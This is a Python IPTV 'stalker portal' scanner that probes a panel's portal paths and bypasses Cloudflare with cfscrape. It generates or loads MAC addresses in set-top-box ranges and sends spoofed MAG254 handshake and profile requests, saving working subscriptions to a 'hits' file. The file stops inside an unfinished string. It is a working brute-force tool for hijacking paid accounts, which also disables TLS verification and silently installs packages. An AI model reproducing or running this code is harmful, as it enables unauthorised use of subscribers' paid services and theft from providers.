import hashlib
import pip
import os
import random
import re
import sys
import time
from datetime import date
import logging
import socket

try:
    import flag
except:
    pip.main(['install', 'flag'])
    import flag
try:
    import termcolor
except:
    pip.main(['install', 'termcolor'])
    import termcolor

try:
    import colorama
except:
    print("colorama module is not installed \n colorama module is installing \n")
    pip.main(['install', 'colorama'])
    import colorama
from colorama import Fore, Style
# from colorama import init as colorama_init

print(Style.RESET_ALL)
try:
    from colorama import just_fix_windows_console
    from termcolor import colored
except:
    pass

# colorama.init(autoreset=True)
colorama.init()
try:
    import pathlib
except:
    pip.main(['install', 'pathlib'])
    import pathlib
try:
    import threading
except:
    pip.main(['install', 'threading'])
    import threading
try:
    import requests
except:
    pip.main(['install', 'requests'])
    import requests
try:
    import sock
except:
    pip.main(['install', 'requests[socks]'])
    pip.main(['install', 'sock'])
    pip.main(['install', 'socks'])
    pip.main(['install', 'PySocks'])
    import sock

from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.util.ssl_.DEFAULT_CIPHERS = "TLS_AES_128_GCM_SHA256:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_256_GCM_SHA384:TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256:TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256:TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305_SHA256:TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256:TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384:TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384:TLS_ECDHE_ECDSA_WITH_AES_256_CBC_SHA:TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA:TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA:TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA:TLS_RSA_WITH_AES_128_GCM_SHA256:TLS_RSA_WITH_AES_256_GCM_SHA384:TLS_RSA_WITH_AES_128_CBC_SHA:TLS_RSA_WITH_AES_256_CBC_SHA:TLS_RSA_WITH_3DES_EDE_CBC_SHA:TLS13-CHACHA20-POLY1305-SHA256:TLS13-AES-128-GCM-SHA256:TLS13-AES-256-GCM-SHA384:ECDHE:!COMP:TLS13-AES-256-GCM-SHA384:TLS13-CHACHA20-POLY1305-SHA256:TLS13-AES-128-GCM-SHA256"
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
# if authorc == "cloudflarex" or ccff == "CloudFlare":

try:
    import cfscrape
except:
    pip.main(["install", "cfscrape"])
    import cfscrape
try:
    import cloudscraper
except:
    pip.main(["install", "cloudscraper"])
    import cloudscraper
try:
    sesq = requests.Session()
    option = cfscrape.create_scraper(sess=sesq)
except:
    option = requests.Session()
logging.captureWarnings(True)

my_os = os.name
if my_os == "nt":
    rootDir = "."
    os.system('color')
else:
    rootDir = "/sdcard"


def make_folders(folder_list):
    for folder in folder_list:
        os.makedirs(rootDir + folder, exist_ok=True)


make_folders(['/combo/', '/hits/Trinity★Legend'])

global tokenr, nickn, panel, load
global m3ustat, status_code
global attack, res, http
expired_hits_bypassed = 0
numberofchannels = 0
numberofmovies = 0
numberofseries = 0
hitc = 0
cpm = 0
maca = 0
macv = 0
csay = 0
say = 0
hitsay = 0
domain = ""
panelnoport = ""
portalloadlist = []
Ualist = []
ip = ""
cid = ""
imza = ""
listlink = ""
macs = ""
token = ""
livel = ""
trh = ""
ay = ""
days_exp = ""
playerlink = ""
real = ""
mac = ""
state = ""
vpn = ""
country_name = ""
data_server = ""
scountry = ""
ban = ""
realblue = ""
genmac = ""
channelcat = ""
stalker_portal = "BartFSP"
nick = '☠️Bart&FSP☠️'
txt = "@🔥𝔽𝕊ℙ🔥.txt"
white = """\33[1;37;40m\n"""
start = 0

def clean():
    os.system('cls' if os.name == "nt" else 'clear')

clean()

if my_os == "nt":
    def barts(z):
        for e in z + '\n':
            sys.stdout.write(e)
            sys.stdout.flush()
            time.sleep(0.001)


    barts(f"""
{Style.BRIGHT}{Fore.BLUE}╔══════════════════════════════════════════════════════╗
{Fore.RED}   ██╗░░░░░███████╗░██████╗░███████╗███╗░░██╗██████╗░
{Fore.RED}   ██║░░░░░██╔════╝██╔════╝░██╔════╝████╗░██║██╔══██╗
{Fore.WHITE}   ██║░░░░░█████╗░░██║░░██╗░█████╗░░██╔██╗██║██║░░██║
{Fore.WHITE}   ██║░░░░░██╔══╝░░██║░░╚██╗██╔══╝░░██║╚████║██║░░██║
{Fore.BLUE}   ███████╗███████╗╚██████╔╝███████╗██║░╚███║██████╔╝
{Fore.BLUE}   ╚══════╝╚══════╝░╚═════╝░╚══════╝╚═╝░░╚══╝╚═════╝░
{Fore.RED}                 𝚃𝚛𝚒𝚗𝚒𝚝𝚢 𝚀𝚞𝚊𝚗𝚝𝚞𝚖 𝙵𝚂𝙿
{Fore.WHITE}             𝙵𝙸𝚁𝙴𝚂𝚃𝙸𝙲𝙺 𝚂𝚃𝙰𝙻𝙺𝙴𝚁 𝙿𝙾𝚁𝚃𝙰𝙻
{Fore.BLUE}              𝙰𝚄𝚃𝙷𝙾𝚁: ★ ☆ ★ 𝙱𝙰𝚁𝚃 ★ ☆ ★
{Fore.LIGHTGREEN_EX}               RE:CODE: 🅺🅰️🅼🅱️🅾️
{Fore.BLUE}╚══════════════════════════════════════════════════════╝
""")
    time.sleep(2)
else:
    def print_with_delay(text, delay=0.001):
        for char in text:
            sys.stdout.write(char)
            sys.stdout.flush()
            time.sleep(delay)


    Bart = (f"""\33[0m
     {Fore.RED}🆃🆁🅸🅽🅸🆃🆈 ★ 🅻🅴🅶🅴🅽🅳             \33[0m   
     {Fore.WHITE}🆃🆁🅸🅽🅸🆃🆈 ★ 🅻🅴🅶🅴🅽🅳           \33[0m
     {Fore.BLUE}🆃🆁🅸🅽🅸🆃🆈 ★ 🅻🅴🅶🅴🅽🅳            \33[0m
     {Fore.RED}   𝚃𝚛𝚒𝚗𝚒𝚝𝚢 𝚀𝚞𝚊𝚗𝚝𝚞𝚖 𝙵𝚂𝙿             \33[0m
     {Fore.WHITE}𝙵𝙸𝚁𝙴𝚂𝚃𝙸𝙲𝙺 𝚂𝚃𝙰𝙻𝙺𝙴𝚁 𝙿𝙾𝚁𝚃𝙰𝙻         \33[0m
     {Fore.BLUE} 𝙰𝚄𝚃𝙷𝙾𝚁: ★ ☆ ★𝙱𝙰𝚁𝚃★ ☆ ★         \33[0m
     {Fore.LIGHTGREEN_EX} RE:CODE: 🅺🅰️🅼🅱️🅾️          \33[0m         
           
       \33[0;1m""")
    print_with_delay(Bart)
time.sleep(2)

# pattern = r'(\w{2}:\w{2}:\w{2}:\w{2}:\w{2}:\w{2})'
pattern = r'^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$'

# print("\33[36m ENTER THE NAME YOU WANT TO APPEAR IN THE HITS FILE\n")
nickn = input(f"{Fore.RED}Enter your name >> \33[33m")
if nickn == "":
    if os.name == "nt":
        nickn = "🅺🅰️🅼🅱️🅾️"
    else:
        nickn = "🅺🅰️🅼🅱️🅾️"


def extract_domain(url):
    if "http://" in url or "https://" in url:
        url = url.split("://")[1]
    if "/" in url:
        url = url.split("/")[0]
    if ":" in url:
        url = url.split(":")[0]
    return url


def resolve_domain_to_ip(domain):
    try:
        # Try socket first (faster)
        return socket.gethostbyname(domain)
    except:
        try:
            # Fallback to Google DNS
            response = requests.get(f"https://dns.google/resolve?name={domain}", timeout=3).json()
            return response.get('Answer', [{}])[0].get('data')
        except:
            return None


def get_geolocation(ip_address):
    if not ip_address:
        return "Unable to resolve IP for the domain."

    # Try ipapi.co first
    try:
        response = requests.get(f"https://ipapi.co/{ip_address}/json/",
                                headers={'User-Agent': 'Mozilla/5.0'},
                                timeout=3)
        if response.status_code == 200:
            data = response.json()
            if "error" not in data:
                return f"{data.get('country_name', 'Unknown')}, {data.get('city', 'Unknown')} (IP: {ip_address})"
    except:
        pass

    try:
        response = requests.get(f"http://ip-api.com/json/{ip_address}", timeout=3)
        if response.status_code == 200:
            data = response.json()
            return f"{data.get('country', 'Unknown')}, {data.get('city', 'Unknown')} (IP: {ip_address})"
    except:
        pass

    return f"Unable to fetch location information for IP: {ip_address}"


def test_portal_paths(domain, paths):

    best_portal = None
    best_score = 0

    for path in paths:
        url = f"http://{domain}{path}"
        try:
            start_time = time.time()
            response = requests.get(url, timeout=3)
            end_time = time.time()
            response_time = end_time - start_time

            if response.status_code == 200:
                content = response.text.lower()
                content_score = 0
                if "stalker" in content:
                    content_score += 10
                if "portal" in content:
                    content_score += 5

                latency_score = 1 / response_time if response_time > 0 else 0
                total_score = content_score + (latency_score * 10)

                if total_score > best_score:
                    best_score = total_score
                    best_portal = path

            print(f"\33[36mTested: {Fore.GREEN}{path}\33[0m")

        except requests.RequestException:
            print(f"{Fore.RED}Failed: {Fore.LIGHTRED_EX}{path}\33[0m")
            continue

    return best_portal


# Portal paths
portal_paths = [
    "/server/load.php",
    "/stalker_portal",
    "/stalker_portal/server/load.php",
    "/rmxportal",
    "/c/portal.php",
    "/c/server/load.php",
    "/client/",
    "/cmdforex",
    "/portalstb",
    "/powerfull",
    "/magaccess",
    "/maglove"
]

# Main script flow
print(f"\n{Fore.BLUE}Enter a domain or Panel URL (e.g., http://example.com:80/c/):\33[0m")
panel = input(f"{Fore.RED} URL: \33[97m").strip()

# # Use default URL if none is provided
# if not panel:
#     panel = "http://lordofthepings.xyz:8080/c/"
#     print(f"\n\33[36mUsing default URL: {panel}\33[0m")

# Extract domain
domain = extract_domain(panel)

# Resolve domain to IP with timeout
ip_address = resolve_domain_to_ip(domain)
if ip_address:
    print(f"\n{Fore.WHITE}Resolved IP: {Fore.GREEN}{ip_address}\33[0m")
    location = get_geolocation(ip_address)
else:
    location = "Unable to resolve IP for the domain."
    print(f"\n\33[91mWarning: Domain appears to be offline or unreachable\33[0m")
    if input("\n\33[95;96mDo you want to continue testing portal paths anyway? (y/n): \33[0m").lower() != 'y':
        print("\n\33[91mExiting...\33[0m")
        exit()

print(f"\n{Fore.LIGHTYELLOW_EX}Suggested VPN Location: {Fore.GREEN}{location}\33[0m")

# Test portal paths with progress indication
print(f"\n{Fore.MAGENTA}Testing portal paths...\33[0m")
best_portal = test_portal_paths(domain, portal_paths)
if best_portal:
    print(f"\n\33[92;96mBest Portal Path: \33[97m{best_portal}\33[0m")
else:
    print("\n\33[91mNo valid portal found.\33[0m")

input("\n\33[91mPress Enter to continue...\33[0m")

if "https" in panel:
    http = "https://"
else:
    http = "http://"
if "http://" in panel or "https://" in panel:
    panel = panel.split("://")[1]
if '/server/load.php' in panel:
    panel = panel.replace('/server/load.php', "")
if "/stalker_portal" in panel:
    panel = panel.replace("/stalker_portal", "")
if "/stalker_portal/server/load.php" in panel:
    panel = panel.replace("/stalker_portal/server/load.php", "")
if "/rmxportal" in panel:
    panel = panel.replace("/rmxportal", "")
if '/c/portal.php' in panel:
    panel = panel.replace('/c/portal.php', "")
if '/c/server/load.php' in panel:
    panel = panel.replace('/c/server/load.php', "")
if '/client/' in panel:
    panel = panel.replace('/client/', "")
if '/c/server/load.php' in panel:
    panel = panel.replace('/c/server/load.php', "")
if "/cmdforex" in panel:
    panel = panel.replace("/cmdforex", "")
if "/portalstb" in panel:
    panel = panel.replace("/portalstb", "")
if "/powerfull" in panel:
    panel = panel.replace("/powerfull", "")
if "/magaccess" in panel:
    panel = panel.replace("/magaccess", "")
if "/maglove" in panel:
    panel = panel.replace("/maglove", "")

panel = panel.replace("/c/", "")
panel = panel.replace("/c", "")
panel = panel.replace("/", "")
domain = panel  # both without http
if ":" in panel:
    port = panel.split(':')[1]
    panelnoport = panel.split(':')[0]  # panelnoport=panel with port removed domain = domain/panel with port if available
else:
    panelnoport = domain

user_agents_list = [
    'Mozilla/5.0 (iPad; CPU OS 12_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.83 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36',
    'Mozilla/5.0 (X11; U; Linux i686; en-GB; rv:1.7.6) Gecko/20050405 Epiphany/1.6.1 (Ubuntu) (Ubuntu package 1.0.2)',
    'Mozilla/5.0 (X11; Linux i686; U;rv: 1.7.13) Gecko/20070322 Kazehakase/0.4.4.1',
    'Mozilla/5.0 (X11; U; Linux 2.4.2-2 i586; en-US; m18) Gecko/20010131 Netscape6/6.01',
    'Mozilla/5.0 (X11; U; Linux i686; de-AT; rv:1.8.0.2) Gecko/20060309 SeaMonkey/1.0',
    'Mozilla/5.0 (X11; U; Linux i686; en-US; Nautilus/1.0Final) Gecko/20020408',
    'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801',
    'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 13_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.5 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/119.0',
    'Mozilla/5.0 (Android 13; Mobile; rv:109.0) Gecko/119.0 Firefox/119.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 12_2_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36 [ip:127.0.0.1:80]',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 [ip:127.0.0.1:80]',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 [ip:127.0.0.1:80]',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0'
    'Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Cloudflare-AMPHTML)'
    'Mozilla/5.0 (Linux; U; Android 4.2.2; pt-; HP 8 Build/1.0.7_WW-FIR-13) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Safari/534.30'
    'Mozilla/5.0 (Linux; Android 5.1; AFTS Build/LMY47O) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/41.99900.2250.0242 Safari/537.36'
]

portalload = [
    '/portal.php', '/server/load.php', '/stalker_portal', '/stalker_portal/server/load.php', '/c/portal.php',
    '/c/server/load.php', '/magaccess/portal.php', '/portalcc.php', '/bs.mag.portal.php', '/magportal/portal.php',
    '/maglove/portal.php', '/tek/server/load.php', '/emu/server/load.php', '/emu2/server/load.php',
    '/ghandi_portal/server/load.php', '/magLoad.php', '/ministra/portal.php', '/portalstb/portal.php', '/xx/portal.php',
    '/portalmega.php', '/portalmega/portal.php', '/rmxportal/portal.php', '/portalmega/portalmega.php',
    '/powerfull/portal.php', '/korisnici/server/load.php', '/korisnici', '/nettvmag/portal.php', '/cmdforex/portal.php',
    '/k/portal.php', '/p/portal.php', '/cp/server/load.php', '/extraportal.php', '/Link_Ok/portal.php',
    '/delko/portal.php', '/delko/server/load.php', '/bStream/portal.php', '/bStream/server/load.php',
    '/blowportal/portal.php', '/client/portal.php', '/server/move.php', '/magportal', '/magaccess', '/powerfull',
    '/client', '/ministra', '/ghandi_portal/c/', '/portalstb', '/stalker_portal/stb', '/stalker_portal/c_/', '/aurora',
    '/cmdforex', '/maglove', '/blowportal', '/extraportal', '/Link_OK', '/bStream', '/delko', '/emu', '/emu2', '/mag',
    '/tek/', '/c_/', '/xui', '']

status_code = 0
getrequest = 0
print("\nAuto Portal Scan Please Wait\n")
# print(text)
for verifiedload in portalload:
    try:
        agent = random.choice(user_agents_list)
        getrequest = option.get(http + panel + verifiedload, headers={'User-Agent': agent}, timeout=(5, 10), verify=False)
    except Exception as error:
        time.sleep(0.1)
    try:
        status_code = getrequest.status_code
    except AttributeError:
        print("attribute error")
        time.sleep(0.5)
    if status_code == int(200):
        portalloadlist.append(verifiedload)  # verifiedload=portal.php etc http://mytv-extra.com:88 http://line.4smart.in/c/ https://zodiacpro.xyz/
        Ualist.append(agent)  # agent=user-agent
    else:
        pass
load = 1
host = panel

if len(portalloadlist) == 0:
    print("\33[1;35mThe Url scan has failed to find a suitable Portal load\nreverting to a manual choice.\33[0;95m")
    time.sleep(3)
    for i in portalload:
        say = say + 1
        print(Fore.LIGHTYELLOW_EX + str(say) + Fore.RED + " ➭ " + Fore.BLUE + str(i))
    say = 0
    load = input('\nOption' + Fore.RED + ' ➭ ' + Fore.WHITE)
    if load == "0":
        load = input(" Portal Type ➭ ")
    if load == "":
        load = "1"

    load = portalload[int(load) - 1]
    if load == "stalker_portal/server/load.php - old":
        stalker_portal = "2"
        load = "stalker_portal/server/load.php"
    if load == "stalker_portal/server/load.php - «▣»":
        stalker_portal = "1"
        load = "stalker_portal/server/load.php"
    if load == "portal.php - No Ban":
        ban = "ban"
        load = "portal.php"
    http = "http"
    if load == "portal.php - Real Blue":
        realblue = "real"
        load = "portal.php"
    if load == "portal.php - httpS":
        load = "portal.php"
        http = "https"
    if load == "stalker_portal/server/load.php - httpS":
        load = "stalker_portal/server/load.php"
        http = "https"
    print(load)
    time.sleep(4)
else:
    print("\33[1;36mAvailable Portal Type's\33[0;97m")
    paneldetails = []
    i = 1
    for host in portalloadlist:
        paneldetails.append(host)
        print(f"\33[0;97m{i}{' '}\33[1;94m{host}")
        i += 1
    try:
        portaltype = (input("\33[1;36mChoose Portal Scan = "))
        if portaltype == "":
            portaltype = "1"
        portaltype = int(portaltype)
        load = portalloadlist[portaltype - 1]
        print(f'\33[94m{"Selected Load "}\33[97m {load}')
        time.sleep(2)
    except:
        if load == "":
            load = "/portal.php"
        print(load)

attack = ""
if load == "/portal.php": attack = " ⁿᵒʳᵐᵃˡ"
if load == "/c/portal.php": attack = " ᴺˣᵀ"
if load == "/server/load.php": attack = " ˢᴸ⁻ᵁˡᵗʳᵃ"
if ban == "ban": attack = " ˣᵁᴵ"
if realblue == "real": attack = " ᴮˡᵘᵉ"
if load == "/stalker_portal/server/load.php": attack = "stalker ⁿᵒʳᵐᵃˡ"
if stalker_portal == "2": attack = "/stalker ᶜᵘˢᵗᵒᵐ"
if stalker_portal == "1": attack = "/stalker ᴬᴸᴸ"
if http == "https": attack = attack + "⁻ˢ"
if load == "/ministra/portal.php": attack = " ᴹⁱⁿⁱˢᵗʳᵃ"
if load == "/powerfull/portal.php": attack = " ᴾ⁻ᶠᵘˡˡ"
if load == "/portalstb/portal.php": attack = " ˢᵗᵇ"
if load == "/magaccess/portal.php": attack = " ᴹ⁻ᵃᶜᶜᵉˢ"
if load == "/bs.mag.portal.php": attack = " ᴮˢ"
if load == "/portalcc.php": attack = " ᶜᶜ"
if load == "/magLoad.php": attack = " ᴹᵍᴸ⁻ᵘˡᵗʳᵃ"
if load == "/stalke.php": attack = " ˢᵗ⁻ᵁˡᵗʳᵃ"
if load == "/delko/portal.php": attack = " ᵈᵉˡᵏᵒ"
if load == "/rmxportal/portal.php": attack = " ᴿᵐ⁻ᵁˡᵗʳᵃ"
if load == "/cmdforex/portal.php": attack = " ᶜᵐ⁻ᵁˡᵗʳᵃ"
if load == "c/server/load.php": attack = " ᶜ'ˢᴸ⁻ᵁˡᵗʳᵃ"

clean()
say = 0
message1 = "\n\33[0;94mPress 0 For Random Combo or Select your Combo Number to scan!! "
combo = rootDir + '/combo/'
numcomfile = "\n     \33[94;47m 0 «» Random Combo)  \33[0m\n"

for files in os.listdir(combo):
    say = say + 1
    numcomfile = numcomfile + Fore.LIGHTYELLOW_EX + str(say) + Fore.RED + " =» " + Fore.BLUE + files + '\n'

print(f'{numcomfile}\33[1;95m{say} Combos found in Combo Folder!')

try:
    selectcombo = str(input("\33[31m" + message1 + "\nCombo Number = \33[0m")).strip()
    selectcombo = "0" if not selectcombo else selectcombo

    if selectcombo == "0":
        print("\33[97mRandom Combo Selected")
        fileas = "Random Mac"

    comborange = int(selectcombo)
    if comborange not in range(0, say + 1):
        raise ValueError("Incorrect combo selection")

    totLen = "000000"
    filea = ""

    if selectcombo == "0":
        try:
            mactrys = input("""\33[1;93mEnter the desired number of Mac combinations Default\33[1;97m 300000
                    \33[1;93mNumber of Combinations \33[1;96m= """)
            mactrys = 300000 if not mactrys.strip() else int(mactrys)
            print(f'\33[1;97m {mactrys}\33[1;96m\n')
        except ValueError:
            print("Invalid input, using default 300000")
            mactrys = 300000
    else:
        say = 0
        for files in os.listdir(combo):
            say = say + 1
            if selectcombo == str(say):
                filea = (combo + files)
                break

        if not filea:
            raise ValueError("Wrong combo file selection")

        print(files)
        fileas = files

        with open(filea, 'r', encoding='utf-8') as c:
            totLen = c.readlines()
        random.shuffle(totLen)
        mactrys = len(totLen)

    macrange = ('00:1A:79:', '00:1a:79:', '33:44:CF:', '10:27:BE:', 'A0:BB:3E:',
                '55:93:EA:', '04:D6:AA:', '11:33:01:', '00:1C:19:', '1A:00:6A:',
                '1A:00:FB:', '00:A1:79:', '00:1B:79:', '00:2A:79:')

    if selectcombo == "0":
        mrang = input("Press\33[1;97m Enter \33[1;96mfor\33[1;97m 00:1A:79:\33[1;96m or\33[1;97m 1 \33[1;96mto choose "
                      "your mac-range \33[39m").strip()
        if not mrang:
            mactype = "00:1A:79:"
            print(mactype)
        else:
            mrange = len(macrange)
            for xd in range(mrange):
                graph = '  》' if int(xd) >= 9 else '   》'
                print(f"{xd + 1}{graph}{macrange[xd]}")

            try:
                mactype = input(" Choose Mac Type...\nDefault = 1 \n Enter the mac range = ").strip()
                mactype = macrange[0] if not mactype else macrange[int(mactype) - 1]
                print(mactype)
            except (ValueError, IndexError):
                print("Invalid selection, using default 00:1A:79:")
                mactype = "00:1A:79:"

except Exception as e:
    print(f"Error: {e}")
    quit()

# amount of bots
print("\n\33[1;94mA maximum of 15 Bots")
numbots = input("Enter number of Bots for scan: Default\33[0;97m = 3 \nEnter choice:= ")
if numbots == "":
    numbots = int(3)
numbots = int(numbots)


# choose output file contents
def channelcategory():
    global channelcat
    channelcat = input("""\n
\33[44m\33[35;4;030m    Choose your output Data?     \33[0m
\33[44m\33[38;0;062m 0 = Connection Details          \33[0m
\33[44m\33[38;0;95m 1 = Connection and Live Channels\33[0m
\33[46m\33[38;0;91m 2 = All Data + VOD + Box Sets   \33[0m
\33[46m\33[38;0;062m 3 = Group Post Mode             \33[0m
\33[1;46m                                 \33[0m    
\33[46m\33[38;0;93m Default = 2: Enter Choice ->  \33[97m  """)
    if channelcat == "":
        channelcat = "2"
        pass
    if channelcat.isdigit():
        channelcat = int(channelcat)
        if 0 <= channelcat <= 3:
            pass
    else:
        clean()
        print("\33[0m\33[97mWrong Selection try again")
        channelcategory()


channelcategory()
channelcat = str(channelcat)

# Save Directory
SaveDirA = rootDir + '/hits/Trinity★Legend/' + panel.replace(":", "_").replace('/', '') + "_Trinity★Legend.txt"
# SaveDirA = f"{rootDir}{'/hits/'}{panel.replace(":", "_").replace('/', '')}{"_🔥ӄ4ʍɮo_Q̶n̶t̶m̶F̶s̶p̶🔥.txt"}"
hitsay = 0


# Set up hit file
def fsph(hits):
    file = open(SaveDirA, 'a+', encoding='utf-8')
    file.write(hits)
    file.close()


def month_string_to_number(ay):
    m = {'jan': 1, 'feb': 2, 'mar': 3, 'apr': 4, 'may': 5, 'jun': 6, 'jul': 7, 'aug': 8, 'sep': 9, 'oct': 10, 'nov': 11,
         'dec': 12}
    s = ay.strip()[:3].lower()
    try:
        out = m[s]
        return out
    except:
        raise ValueError('Not a month')

def days_clear(trh):
    try:
        ay = str(trh.split(' ')[0])
        gun = str(trh.split(', ')[0].split(' ')[1])
        yil = str(trh.split(', ')[1])
        ay = str(month_string_to_number(ay))
        trai = str(gun) + '/' + str(ay) + '/' + str(yil)
        d = date(int(yil), int(ay), int(gun))
        sontrh = time.mktime(d.timetuple())
        out = int((sontrh - time.time()) / 86400)
        return out
    except:
        return None

def randommac():
    global genmac
    try:
        genmac = str(mactype) + "%02x:%02x:%02x" % (
            (random.randint(0, 256)), (random.randint(0, 256)), (random.randint(0, 256)))
    except:
        pass
    genmac = genmac.replace(':100', ':10')
    return genmac


url1 = f'{http}{panel}{load}?type=stb&action=handshake&prehash=false&JsHttpRequest=1-xml'
url2 = f'{http}{panel}{load}{"?type=stb&action=get_profile&JsHttpRequest=1-xml"}'
if realblue == "real":
    url2 = f'{http}{panel}{load}?&action=get_profile&mac="{macs}"&type=stb&hd=1&sn=&stb_type=MAG250&client_type=STB&image_version=218&device_id=&hw_version=1.7-BD-00&hw_version_2=1.7-BD-00&auth_second_step=1&video_out=hdmi&num_banks=2&metrics=%7B%22mac%22%3A%22"{macs}"%22%2C%22sn%22%3A%22%22%2C%22model%22%3A%22MAG250%22%2C%22type%22%3A%22STB%22%2C%22uid%22%3A%22%22%2C%22random%22%3A%22null%22%7D&ver=ImageDescription%3A%200.2.18-r14-pub-250%3B%20ImageDate%3A%20Fri%20Jan%2015%2015%3A20%3A44%20EET%202016%3B%20PORTAL%20version%3A%205.6.1%3B%20API%20Version%3A%20JS%20API%20version%3A%20328%3B%20STB%20API%20version%3A%20134%3B%20Player%20Engine%20version%3A%200x566'
url3 = f'{http}{panel}{load}{"?type=account_info&action=get_main_info&JsHttpRequest=1-xml"}'
url5 = f'{http}{panel}{load}?action=create_link&type=itv&cmd=ffmpeg%20http://localhost/ch/106422_&JsHttpRequest=1-xml'
url6 = f'{http}{panel}{load}?type=itv&action=get_all_channels&force_ch_link_check=&JsHttpRequest=1-xml'

liveurl = f'{http}{panel}{load}?action=get_genres&type=itv&JsHttpRequest=1-xml'
vodurl = f'{http}{panel}{load}?action=get_categories&type=vod&JsHttpRequest=1-xml'
seriesurl = f'{http}{panel}{load}?action=get_categories&type=series&JsHttpRequest=1-xml'


def url(cid):
    url7 = f"{http}{panel}{load}?type=itv&action=create_link&cmd=ffmpeg%20http://localhost/ch/{cid}_&series=&forced_storage=0&disable_ad=0&download=0&force_ch_link_check=0&JsHttpRequest=1-xml"
    return url7


def hea1(macs):
    HEADERA = {
        "User-Agent": "Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 4 rev: 1812 Mobile Safari/533.3",
        "Referer": http + panel + "/c/",
        "Accept": "application/json,application/javascript,text/javascript,text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Cookie": "mac=" + macs + "; stb_lang=en; timezone=Europe/Paris;",
        "Accept-Encoding": "gzip, deflate",
        "Connection": "Keep-Alive",
        "X-User-Agent": "Model: MAG254; Link: Ethernet",
    }
    return HEADERA


def hea2(macs, token):
    HEADERd = {
        "User-Agent": "Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 4 rev: 1812 Mobile Safari/533.3",
        "Referer": http + panel + "/c/",
        "Accept": "application/json,application/javascript,text/javascript,text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Cookie": "mac=" + macs + "; stb_lang=en; timezone=Europe/Paris;",
        "Accept-Encoding": "gzip, deflate",
        "Connection": "Keep-Alive",
        "X-User-Agent": "Model: MAG254; Link: Ethernet",
        "Authorization": "Bearer " + token,
    }
    return HEADERd


def hea3():
    hea = {
        "Icy-MetaData": "1",
        "User-Agent": "Lavf/57.83.100",
        "Accept-Encoding": "identity",
        "Host": panel,
        "Accept": "*/*",
        "Range": "bytes=0-",
        "Connection": "close",
    }
    return hea


data1 = ""
bad = 0
while True:
    try:
        res = option.get(listlink, headers=hea2(mac, token), timeout=20, verify=False)
        data1 = str(res.text)
        break
    except:
        bad = bad + 1
        if bad == 3:
            break

if "active_cons" in data1:
    acon = data1.split('active_cons":')[1]
    acon = acon.split(",")[0]
    acon = acon.replace('"', "")
    mcon = data1.split('max_connections":')[1]
    mcon = mcon.split(",")[0]
    mcon = mcon.replace('"', "")
    status = data1.split('status":')[1]
    status = status.split(",")[0]
    status = status.replace('"', "")

hitsay = 0


def hit(mac, trh, real, m3ulink, m3uhost, m3ustat, state, vpn, livelist, vodlist, serieslist, playerapi, fname,
        tariff_plan, ls, login, password, tariff_plan_id, bill, expire_billing_date, max_online, parent_password,
        stb_type, comment, country, settings_password, country_name, scountry, numberofchannels, numberofmovies,
        numberofseries):
    global hitr, macv, hitsay
    panell = panel
    reall = real

    kimza = """	
╔═════★☆𝐓𝐫𝐢𝐧𝐢𝐭𝐲 𝐋𝐞𝐠𝐞𝐧𝐝☆★═════ 
╠═ 𝐂𝐎𝐃𝐄 𝐁𝐘 𝐆𝐑𝐀𝐇𝐀𝐌 𝐖𝐀𝐋𝐊𝐄𝐑
╠═  ★☆𝐋𝐄𝐆𝐄𝐍𝐃𝐒 𝐍𝐄𝐕𝐄𝐑 𝐃𝐈𝐄☆★   
║
╠═❱❱❱ Host http://""" + str(panell) + """/c/
╠═❱❱❱ Real http://""" + str(reall) + """
╠═❱❱❱ Mac """ + str(mac) + """
╠═❱❱❱ Expires """ + str(trh) + """ 
╠═❱❱❱ Hits By  """ + str(nickn) + """
╚═══════════★☆☆★═════════

"""

    imza = """
